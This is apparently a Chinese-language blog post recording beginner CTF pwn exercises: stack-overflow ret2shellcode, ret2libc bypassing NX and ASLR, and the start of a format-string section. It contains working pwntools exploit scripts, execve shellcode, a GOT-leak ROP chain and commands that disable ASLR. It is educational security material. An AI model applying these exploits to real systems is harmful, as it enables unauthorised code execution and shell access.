@@ -1,0 +1,1196 @@
+<!DOCTYPE HTML>
+<html lang="">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="pwn实践记录--rop入门, shanah&#39;s blog">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>pwn实践记录--rop入门 | shanah&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">shanah&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>Contact</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">shanah&#39;s blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">pwn实践记录--rop入门</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                            <a href="/tags/pwn/">
+                                <span class="chip bg-color">pwn</span>
+                            </a>
+                        
+                            <a href="/tags/%E8%AE%B0%E5%BD%95/">
+                                <span class="chip bg-color">记录</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2020-03-07
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/1.jpg" alt="1.jpg"><br>回过来记录入门历程主要是为了复习巩固pwn的分析思路。因为写的很详细，篇幅很长，未写完的会第二天写。全部内容包括：ret2shellcode、ret2libc(绕过NX)、ret2libc(绕过ASLR)、格式化字符串漏洞。若理解有错误，请在评论区指正，阿里嘎多。</p>
+<a id="more"></a>
+<p>本次回顾涉及到的elf文件以及exp都能在<a href="https://github.com/TonyShanc/new2pwn" target="_blank" rel="noopener">这里</a>获取到。<br>环境准备：linux(32位程序运行环境)、IDA Pro、gdb插件、python+pwntools、不屈意志:)<br>知识回顾：<a href="https://blog.csdn.net/RChaos/article/details/104344276" target="_blank" rel="noopener">操作系统预防二进制漏洞的保护机制</a>、elf文件组成、栈机制、大小端。</p>
+<h4 id="0x00-return2shellcode"><a href="#0x00-return2shellcode" class="headerlink" title="0x00 return2shellcode"></a>0x00 return2shellcode</h4><p>文件：level1<br>习惯性查看保护机制：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/2.jpg" alt><br>很好全关，接下来利用IDA Pro F5大法查看反汇编结果：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/3.jpg" alt="3.jpg"><br>发现该二进制文件main函数入口直接调用vulnerable_function()函数，然后调用了write函数。这里提个醒，反汇编遇到write()、read()、puts()、gets()一定留个心眼，这些函数对任意变量的处理都可能造成栈溢出，不过本题输出的是字符串常量，忽略，直接查看vulnerable_function()。<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/4.jpg" alt="4.jpg"><br>看到该函数创建了个局部变量（数组指针），位置距离ebp-0x88的位置，也就是距离基指针136字节位置。read()函数读取了该函数的局部变量，上文提到read()函数不检查读取限制，并且局部变量存放在栈中，因此我们可以构造payload长度=136+4(存储ebp指针地址大小)+4(返回地址大小), 来改变函数返回地址。考虑到PIE已关，并且140字节的长度足够存储一个shellcode执行execve(“/bin/sh”)。因此我们从payload的开始位置存shellcode，剩下的用’A’补全，返回地址指向payload起始地址，也就是局部变量的起始地址。但是地址我们还不知道，因为它是在栈里面加载的。考虑到栈的动态变化，IDAPro的静态分析无法展示（它的动态分析比较麻烦），接下来用<strong>gdb配合peta插件</strong>进行动态分析：<br>在入口函数下断点：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/5.jpg" alt="5.jpg"><br>run/start 执行到main函数入口停下：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/6.jpg" alt="6.jpg"><br>依次<br>next  next<br>在汇编下一步执行vulnerable_function()函数的时候，step命令进入函数内部：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/7.jpg" alt="7.jpg"><br>进入之后，我们就能看到该函数的栈情况了<br>接下来依次next 执行到read()函数的时候，象征性输入字符：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/8.jpg" alt="8.jpg"><br>可以看到栈区0xffffd060地址上存放了该局部变量（上面的0xffffd060是文字常量区（常量池）范围内的地址，主要存储字符串常量），至此所有的分析工作就完成了。</p>
+<p>接下来最最最关键的地方来了，很多初学者都会落进去的坑：其实gdb调试和实际执行程序的栈位置相比会有些偏移，为了提供buf更精确的位置，我们需要开启core dump功能来收集实际运行环境下的变量分布情况。<br>暂时开启core dump命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ulimit</span> -c unlimited</span><br></pre></td></tr></table></figure>
+<p>执行level1:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./level1</span><br></pre></td></tr></table></figure>
+<p>输入字符使栈溢出。<br>可以看到目录下多出来了个core文件。<br>接下来用gdb 配合core文件再次调试level1<br>然后输入<code>x $esp-144</code>查看buf的位置, 这里的esp指的是实际环境下程序执行出错的时候的esp, 执行返回命令时，esp退回到main函数的栈顶，因此buf的位置 = esp指针存的位置 - payload的长度(144)。<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/10.jpg" alt="8.jpg"><br>得到buf实际地址：0xffffd0c0<br>接下来我们就能安心的写exp了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./level1'</span>)</span><br><span class="line">ret = <span class="number">0xffffd0c0</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode += <span class="string">"\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line">payload = shellcode + <span class="string">'A'</span> * (<span class="number">140</span> - len(shellcode)) + p32(ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>效果如下：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/9.jpg" alt="8.jpg"></p>
+<h4 id="0x01-ret2libc-绕过NX"><a href="#0x01-ret2libc-绕过NX" class="headerlink" title="0x01 ret2libc(绕过NX)"></a>0x01 ret2libc(绕过NX)</h4><p>文件：level2<br>保护：NX<br>查看保护机制：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/11.jpg" alt="8.jpg"><br>PIE(ASLR)是系统保护，有时查看文件保护机制虽然显示enabled , 但其实是开着的，保险起见，我们可以用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+<p>或者多次ldd &lt;filename&gt;查看地址偏移情况:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd level2</span><br></pre></td></tr></table></figure>
+<p>修改用重定向就行了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+<p>NX开启，栈数据段没有执行权限，因此不能将shellcode存在栈上。考虑到PIE(ASLR)没开，libc动态链接库中有execve()函数，并且存在”/bin/sh”字符串，接下来的思路就是覆盖返回地址，执行libc中的execve()或system(), 并将指向”/bin/sh”的指针作为函数的参数。<br>用IDA Pro打开，反汇编并整理成C代码，发现代码和上一题是一样的，知识NX没开；<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/3.jpg" alt="6.jpg"><br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/4.jpg" alt="6.jpg"><br>下面要做的工作是：调试level2，在libc动态链接库载入之后，找到两个系统函数和”/bin/sh”的地址。<br>在main()处设断点后，运行。<br>此时libc动态库已经载入了，然后用print 和 find命令分别查找函数和字符串的地址：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/12.jpg" alt="6.jpg"><br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/13.jpg" alt="6.jpg"><br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/14.jpg" alt="6.jpg"><br>下面是这道题的关键，传递的”/bin/sh”应该放在payload的哪个位置？<br>答：在返回地址的下一个高地址位。<br>这个问题我之前在调试信息里分析了好久，终于找到了比较合理的解释(后来才发现是我栈机制没完全看明白。。)。<br>我们先借助main()函数内部的write()调用过程来看看它的参数传递过程：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/16.jpg" alt="6.jpg"><br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/15.jpg" alt="6.jpg"><br>容易看出，执行call 0x8048340 &lt;write@plt&gt; (plt下一题会讲到) 后，栈中存进了该汇编指令的下一个指令的地址，也就是write()的返回地址。细看，又会发现write函数的三个参数，在调用call指令之前就已经压栈了，压栈顺序是参数从右到左的顺序。对应的汇编指令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x804843b &lt;main+14&gt;:	mov    DWORD PTR [esp+0x8],0xd</span><br><span class="line">0x8048443 &lt;main+22&gt;:	mov    DWORD PTR [esp+0x4],0x8048530</span><br><span class="line">0x804844b &lt;main+30&gt;:	mov    DWORD PTR [esp],0x1</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/17.jpg" alt="6.jpg"><br>因此可以这样总结：函数参数先逆序入栈，接下来才标记返回地址和执行被调用函数汇编指令。<br>分析完后，看看execve()和system()的传参要求：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int execve(const char *filename, char *const argv[], char *const envp[]);</span><br><span class="line">int system(const char * string);</span><br></pre></td></tr></table></figure>
+<p>发现system只要求一个文件名字符串指针，本着谁参数少欺负谁的态度，盘它！<br>构造payload: <code>payload = &#39;A&#39; *140 + sys_addr + &#39;A&#39; * 4 + binsh_addr</code><br>注意！这里’A’ * 4 是因为返回地址是直接到system函数内部的，没有经过call &lt;system@plt&gt;, 返回地址未压栈, 但是栈不知道，它还会认为有个返回地址，因此这里的‘A’ * 4是填补返回地址用的，如果你还想在返回时做进一步的事情，可以写个确切的地址。</p>
+<p>这里说一句：这里不用像上一题产生core dump ，因为返回地址不在栈中，没有地址偏移影响。<br>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./level2'</span>)</span><br><span class="line"><span class="comment">#p = remote('127.0.0.1',10002)</span></span><br><span class="line">sys_addr=<span class="number">0xf7e138b0</span></span><br><span class="line">binsh_addr=<span class="number">0xf7f5e42d</span></span><br><span class="line">payload =  <span class="string">'A'</span>*<span class="number">140</span> + p32(sys_addr) + <span class="string">'A'</span>*<span class="number">4</span> + p32(binsh_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/19.jpg" alt="6.jpg"></p>
+<h4 id="0x02-ret2libc-绕过ASLR-PIE"><a href="#0x02-ret2libc-绕过ASLR-PIE" class="headerlink" title="0x02 ret2libc(绕过ASLR/PIE)"></a>0x02 ret2libc(绕过ASLR/PIE)</h4><p>文件：还是level2<br>保护：ASLR NX<br>下面我们把系统ASLR/PIE防护开启：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line"><span class="built_in">echo</span> 2 &gt;  /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/20.jpg" alt="figure"><br>这里就不能像上题那样将返回地址覆盖成libc库函数的地址了，因为每次执行libc的地址会有一定的偏移，但我们仍然能定位到libc库函数的地址。具体怎么做呢？<br>level2内的vulnerable_function()内调用read函数时，执行了call &lt;read@plt&gt;指令，plt是什么呢？<a href="https://www.freebuf.com/articles/system/135685.html" target="_blank" rel="noopener">这里</a>有详细的解释。文章内我只简单解释。。<br>我们先读取level2文件的elf结构：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/21.jpg" alt="figure"><br>发现.plt段在level2文件内，和程序段.text是分开的。<br>这里就不放图了，不知道为什么我step进call &lt;write@plt&gt;的时候直接跳到了write汇编程序地址，立个flag, 有空补上。<br>简单的说，plt是个跳转表 跳转到got表中read函数地址指针所在的区域，然后在got表内再跳转，最终才会跳转到write函数的地址。这种链接采用的是延迟绑定技术，执行第一个libc库函数时，libc才会链接到到level2，由于我们在vulnerable_function()中执行了read(),write()地址也就固定了。（整个过程我也不是很清楚，如果你想深入了解还得多看看其他资料）。</p>
+<p>下面说说绕过ASLR/PIE的思路：<br>上文提到：调用libc库函数采用延迟绑定技术，执行第一个libc库函数时，libc才会链接到到level2，由于我们在vulnerable_function()中执行了read(),write()地址也就固定了。因此第一步是先获取到write函数真正的地址，记为write_addr。由于write()和system()在libc中的相对位置是固定的，也就是说它们之间的偏移量固定，因此我们就可以先事先获取偏移量，然后借助read函数作为跳板，就能得到system()的地址sys_addr了。同样的”/bin/sh”的地址也能固定，binsh_addr也出来了。<br>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">elf = ELF(<span class="string">'level2'</span>)</span><br><span class="line">p = process(<span class="string">'./level2'</span>)</span><br><span class="line"><span class="comment">#p = remote('127.0.0.1', 10003)</span></span><br><span class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'plt_write= '</span> + hex(plt_write)</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'got_write= '</span> + hex(got_write)</span><br><span class="line">vulfun_addr = <span class="number">0x08048404</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'vulfun= '</span> + hex(vulfun_addr)</span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">0x1</span>) +p32(got_write) + p32(<span class="number">0x4</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###sending payload1 ...###"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###receving write() addr...###"</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'write_addr='</span> + hex(write_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###calculating system() addr and \"/bin/sh\" addr...###"</span></span><br><span class="line">system_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system_addr= '</span> + hex(system_addr)</span><br><span class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'binsh_addr= '</span> + hex(binsh_addr)</span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">140</span>  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###sending payload2 ...###"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>效果如下：<br><img src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/22.jpg" alt="figure"></p>
+<h4 id="0x03格式化字符串漏洞"><a href="#0x03格式化字符串漏洞" class="headerlink" title="0x03格式化字符串漏洞"></a>0x03格式化字符串漏洞</h4><p>文件：pwne (2017湖湘杯pwn200赛题)<br>保护：ASLR NX<br>printf函数的格式化字符串常见的有 %d，%f，%c，%s（用于读取内存数据），%x（输出16进制数，前面没有0x），%p或%#x（输出16进制数，前面带有0x）；%n是一个不经常用到的格式符，它的作用是把前面已经打印的长度写入某个内存地址，用于修改内存，除了%n,还有%hn，%hhn，%lln，分别为写入目标空间4字节，2字节，1字节，8字节。</p>
+<p>综上，格式化字符可以分为两类：读取数据格式符和写入数据格式符。</p>
+<p>这里说一下，不是所有C编译器都支持%n, 我在windows上的codeblocks配的是C99标准的gcc编译器，执行无法靠%n写入数据，在这里我也有点迷惑，出题的人到底是用的什么编译器。。</p>
